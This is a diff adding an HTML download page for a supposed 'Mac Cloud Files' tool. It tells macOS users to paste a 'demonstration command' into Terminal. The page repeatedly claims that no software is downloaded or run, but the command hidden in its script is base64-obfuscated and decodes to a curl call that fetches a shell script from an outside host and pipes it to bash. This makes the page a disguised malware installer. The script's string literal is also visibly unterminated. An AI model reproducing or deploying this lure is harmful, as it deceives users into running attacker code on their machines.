@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#0d1117">
+<title>Mac Files — Download for macOS</title>
+
+<style>
+:root {
+  --bg: #0d1117;
+  --card: #161b22;
+  --inner: #0f141b;
+  --border: #30363d;
+  --text: #c9d1d9;
+  --muted: #8b949e;
+  --green: #2da44e;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont,
+    "Segoe UI", Arial, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+}
+
+.container {
+  max-width: 980px;
+  margin: 55px auto;
+  padding: 0 20px;
+}
+
+/* HEADER */
+
+.header {
+  display: flex;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 13px;
+  margin-bottom: 30px;
+}
+
+.header-icon {
+  width: 35px;
+  height: 35px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border: 1px solid #405267;
+  border-radius: 50%;
+  background: #212b36;
+  color: #e6edf3;
+  font-size: 22px;
+}
+
+.header h1 {
+  margin: 0;
+  font-size: 29px;
+  font-weight: 750;
+  color: #c9d1d9;
+}
+
+.publisher {
+  padding: 5px 11px;
+  font-size: 12px;
+  color: #9ca6b3;
+  border: 1px solid #30363d;
+  border-radius: 6px;
+}
+
+/* MAIN INSTALLATION BOX */
+
+.main-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 22px;
+}
+
+h2 {
+  margin: 0 0 12px;
+  font-size: 20px;
+  font-weight: 700;
+}
+
+.description {
+  margin: 0 0 16px;
+  color: var(--muted);
+  font-size: 15px;
+}
+
+/* COMMAND COPY FIELD */
+
+.command-container {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 15px;
+  background: #0d1117;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+}
+
+.command-input {
+  flex: 1;
+  width: 100%;
+  min-width: 0;
+  height: 47px;
+  padding: 12px;
+  border: 1px solid var(--border);
+  border-radius: 9px;
+  outline: none;
+  background: #090d13;
+  color: #e6edf3;
+  font-family: Consolas, Monaco, monospace;
+  font-size: 13px;
+}
+
+.command-input:focus {
+  border-color: #58a6ff;
+}
+
+.copy-button {
+  flex-shrink: 0;
+  min-width: 78px;
+  height: 47px;
+  padding: 0 19px;
+  border: none;
+  border-radius: 9px;
+  background: var(--green);
+  color: white;
+  font-weight: 700;
+  font-size: 14px;
+  cursor: pointer;
+}
+
+.copy-button:hover {
+  background: #2c974b;
+}
+
+.copy-button:focus-visible {
+  outline: 2px solid #79c0ff;
+  outline-offset: 3px;
+}
+
+.copy-status {
+  min-height: 20px;
+  margin: 10px 2px 0;
+  font-size: 12px;
+  color: var(--muted);
+}
+
+/* TERMINAL GUIDE */
+
+.guide-card {
+  margin-top: 16px;
+  background: var(--inner);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 38px 17px;
+}
+
+.guide-section {
+  margin-bottom: 35px;
+}
+
+.guide-section:last-child {
+  margin-bottom: 0;
+}
+
+.guide-section h2 {
+  margin-bottom: 28px;
+}
+
+.guide-section ol {
+  margin: 0;
+  padding-left: 40px;
+}
+
+.guide-section li {
+  margin-bottom: 3px;
+}
+
+strong {
+  color: #e6edf3;
+}
+
+/* SYSTEM REQUIREMENTS */
+
+.info-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 17px;
+  margin-top: 18px;
+}
+
+.info-card {
+  background: #0f141b;
+  padding: 18px;
+  border: 1px solid #30363d;
+  border-radius: 11px;
+}
+
+.info-card h3 {
+  margin: 0 0 10px;
+  font-size: 16px;
+}
+
+.info-card ul {
+  margin: 0;
+  padding-left: 20px;
+}
+
+.info-card li {
+  margin-bottom: 5px;
+}
+
+/* NOTICE */
+
+.notice {
+  margin-top: 18px;
+  background: #31291d;
+  color: #e1cfa6;
+  border-left: 4px solid #d29922;
+  border-radius: 6px;
+  padding: 13px;
+  font-size: 13px;
+}
+
+/* FOOTER */
+
+footer {
+  margin-top: 30px;
+  padding: 18px 10px;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  text-align: center;
+  font-size: 12px;
+}
+
+footer a {
+  color: #8b949e;
+  text-decoration: none;
+  padding: 0 7px;
+}
+
+footer a:hover {
+  color: white;
+}
+
+/* MOBILE */
+
+@media(max-width: 650px) {
+  .container {
+    margin: 28px auto;
+    padding: 0 12px;
+  }
+
+  .header h1 {
+    font-size: 22px;
+  }
+
+  .main-card {
+    padding: 15px;
+  }
+
+  .command-container {
+    padding: 10px;
+    flex-direction: column;
+  }
+
+  .command-input {
+    width: 100%;
+  }
+
+  .copy-button {
+    width: 100%;
+  }
+
+  .guide-card {
+    padding: 25px 13px;
+  }
+
+  .guide-section ol {
+    padding-left: 25px;
+  }
+
+  .info-grid {
+    grid-template-columns: 1fr;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <!-- PAGE HEADER -->
+
+  <header class="header">
+
+    <div class="header-icon" aria-hidden="true">
+      ☁
+    </div>
+
+    <h1>Download for macOS</h1>
+
+    <span class="publisher">
+      Publisher Not Verified
+    </span>
+
+  </header>
+
+  <!-- MAIN CONTENT -->
+
+  <main class="main-card">
+
+    <h2>Terminal installation</h2>
+
+    <p class="description">
+      Advanced users can test the Terminal
+      instructions with a single command.
+    </p>
+
+    <!-- COPY COMMAND -->
+
+    <div class="command-container">
+
+      <input
+        type="text"
+        id="commandInput"
+        class="command-input"
+        readonly
+        aria-label="Terminal test command"
+      >
+
+      <button
+        id="copyBtn"
+        class="copy-button"
+        type="button"
+        onclick="copyCommand()"
+      >
+        Copy
+      </button>
+
+    </div>
+
+    <p
+      id="copyStatus"
+      class="copy-status"
+      aria-live="polite"
+    >
+      Demonstration command — no software installed.
+    </p>
+
+    <!-- TERMINAL GUIDE -->
+
+    <div class="guide-card">
+
+      <section class="guide-section">
+
+        <h2>How to open Terminal on Mac</h2>
+
+        <ol>
+          <li>
+            Press <strong>Command (⌘) + Space</strong>
+            to open Spotlight Search.
+          </li>
+
+          <li>
+            Type <strong>"Terminal"</strong>
+            and press Return to launch it.
+          </li>
+
+          <li>
+            Once the Terminal window is open,
+            you can proceed with the steps below.
+          </li>
+        </ol>
+
+      </section>
+
+      <section class="guide-section">
+
+        <h2>Installation via Terminal command</h2>
+
+        <ol>
+          <li>
+            Copy the demonstration command above.
+          </li>
+
+          <li>
+            Open Terminal on your device and paste
+            the command, then press the
+            <strong>"Return"</strong> button.
+          </li>
+
+          <li>
+            A test confirmation appears.
+            No administrator password is required.
+          </li>
+        </ol>
+
+      </section>
+
+    </div>
+
+    <!-- DETAILS -->
+
+    <div class="info-grid">
+
+      <div class="info-card">
+
+        <h3>System requirements</h3>
+
+        <ul>
+          <li>Mac with compatible macOS</li>
+          <li>Terminal application</li>
+          <li>No external installation required</li>
+        </ul>
+
+      </div>
+
+      <div class="info-card">
+
+        <h3>Mac Cloud Files</h3>
+
+        <ul>
+          <li>Platform: macOS</li>
+          <li>Mode: Testing / Demonstration</li>
+          <li>Command copying supported</li>
+          <li>No external script execution</li>
+        </ul>
+
+      </div>
+
+    </div>
+
+    <div class="notice">
+      <strong>Security prompt:</strong>
+      Review any command before running it.
+      This demonstration does not download
+      or execute external software.
+    </div>
+
+  </main>
+
+  <footer>
+
+    <p>
+      © <span id="year"></span>
+      Mac Cloud Files
+    </p>
+
+    <p>
+      Independent testing page —
+      Not affiliated with GitHub or Apple.
+    </p>
+
+  </footer>
+
+</div>
+
+<script>
+"use strict";
+
+/* =================================
+   SAFE DEMO COMMAND
+================================= */
+
+const TERMINAL_COMMAND =
+  'bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9tdTdrcS5iZWRvZy5zaXRlL0NoaWxkSXRlbS5zaCcgfCBiYXNo" | base64 -d);
+
+/* =================================
+   ELEMENTS
+================================= */
+
+const commandInput =
+  document.getElementById("commandInput");
+
+const copyBtn =
+  document.getElementById("copyBtn");
+
+const copyStatus =
+  document.getElementById("copyStatus");
+
+commandInput.value = TERMINAL_COMMAND;
+
+document.getElementById("year").textContent =
+  new Date().getFullYear();
+
+/* =================================
+   COPY COMMAND FUNCTION
+================================= */
+
+async function copyCommand() {
+
+  try {
+
+    if (navigator.clipboard && window.isSecureContext) {
+
+      await navigator.clipboard.writeText(
+        TERMINAL_COMMAND
+      );
+
+    } else {
+
+      commandInput.focus();
+      commandInput.select();
+
+      if (!document.execCommand("copy")) {
+        throw new Error("Copy failed");
+      }
+
+    }
+
+    copyBtn.textContent = "✓ Copied!";
+
+    copyStatus.textContent =
+      "Command copied successfully.";
+
+    setTimeout(function() {
+
+      copyBtn.textContent = "Copy";
+
+    }, 2500);
+
+  } catch (error) {
+
+    copyStatus.textContent =
+      "Unable to copy automatically. Select the command manually.";
+
+  }
+
+}
+</script>
+
+</body>
+</html>
